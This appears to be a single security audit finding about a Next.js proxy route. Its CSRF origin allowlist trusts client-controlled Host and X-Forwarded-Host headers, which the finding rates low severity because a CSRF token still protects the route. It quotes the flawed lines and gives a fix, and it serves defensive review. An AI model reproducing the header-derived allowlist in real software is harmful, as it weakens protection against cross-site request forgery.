#### ITMB-108 — Proxy origin allowlist is partly built from client-controlled Host / X-Forwarded-Host headers (weak origin layer; CSRF still held by double-submit token)

- **Severity:** low  •  **Confidence:** medium  •  **Category:** CSRF / Origin Validation
- **Location:** `frontend/src/app/api/backend/[...path]/route.ts:48`

**What & why:** For mutating requests the proxy enforces two CSRF layers (route.ts:116-123): requestOriginAllowed() then csrfTokenValid(). buildAllowedOrigins() seeds the allowed-origin set with req.nextUrl.origin and any ALLOWED_PROXY_ORIGINS env entries, but also adds `${proto}://${host}` derived from the client-supplied x-forwarded-host/host + x-forwarded-proto headers (route.ts:48-51). requestOriginAllowed() then accepts the request when the incoming Origin header is in that set (route.ts:61-62). Because part of the allowlist is request-controlled, the origin layer alone can be satisfied with a forged Host/Origin pair. It also returns true when neither Origin nor Referer is present in non-production (route.ts:75). The second layer, csrfTokenValid() (route.ts:78-87), compares the itemba_csrf cookie against the x-csrf-token header; itemba_csrf is SameSite=Lax (login/route.ts:88) so a cross-site attacker cannot read it, meaning overall CSRF is still enforced. The origin layer is degraded defense-in-depth, not a full bypass.

**Evidence:** route.ts:48 `const host = firstHeaderValue(req.headers.get('x-forwarded-host') ?? req.headers.get('host'));`; route.ts:50-51 add `${proto}://${host}`; route.ts:61-62 `if (origin) { return allowedOrigins.has(origin); }`; route.ts:75 `return process.env.NODE_ENV !== 'production';`; enforced at route.ts:116-123. Backstop: csrfTokenValid route.ts:78-87 with SameSite=Lax itemba_csrf cookie (login/route.ts:88).

**Impact:** The origin check gives weak assurance on its own and would not stop a forged-Host CSRF attempt. It matters only as defense-in-depth today; it would become exploitable if the CSRF token check were removed/relaxed or if the itemba_csrf cookie's SameSite attribute were weakened.

**Fix (summary):** Pin the allowed origin to server-configured canonical values: use req.nextUrl.origin and the explicit ALLOWED_PROXY_ORIGINS env list only, and remove the `${proto}://${host}` entry derived from raw host/x-forwarded-host unless a trusted edge proxy is known to sanitize those headers. Keep csrfTokenValid() as the primary defense.

---

